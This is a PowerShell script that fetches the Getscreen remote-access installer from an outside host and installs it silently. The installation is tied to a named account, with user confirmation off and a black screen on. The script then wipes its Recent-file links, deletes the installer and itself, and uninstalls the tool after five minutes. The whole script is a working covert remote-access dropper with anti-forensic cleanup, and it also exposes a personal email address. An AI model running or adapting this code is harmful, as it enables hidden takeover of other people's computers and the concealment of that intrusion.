# This script will donwload getscreen and install it silently

#Fetching getscreen binary
$webclient = New-Object System.Net.WebClient
$url = "https://getscreen.ru/invite/download/getscreen.msi?utm_user=gb2a1pd2q66z9e8zd2b2x7jdxpjbhj9qxblknr1nng4742379"
$file = "getscreen.msi"
$webclient.DownloadFile($url,$file)

#Installing getscreen without user interaction
Start-Process -FilePath "msiexec.exe" -ArgumentList "/i getscreen.msi /qn REGISTER="tancorovruslan@gmail.com:10791" CONFIG="name='My Computer' language=ru autostart=false nonadmin=true control=true fast_access=false file_transfer=false audio_calls=false black_screen=true disable_confirmation=true"" -Wait

#Removing getscreen binary and this script from recent files
Remove-Item -Path "$env:APPDATA\Microsoft\Windows\Recent\getscreen.msi.lnk"
Remove-Item -Path "$env:APPDATA\Microsoft\Windows\Recent\getscreen.ps1.lnk"
#Removing getscreen binary
Remove-Item -Path "$PSScriptRoot\getscreen.msi"
#Removing this script
Remove-Item -Path $MyInvocation.MyCommand.Path

#Uninstall getscreen after 5 minutes
Start-Sleep -Seconds 300
Start-Process -FilePath "msiexec.exe" -ArgumentList "/x getscreen.msi /qn" -Wait
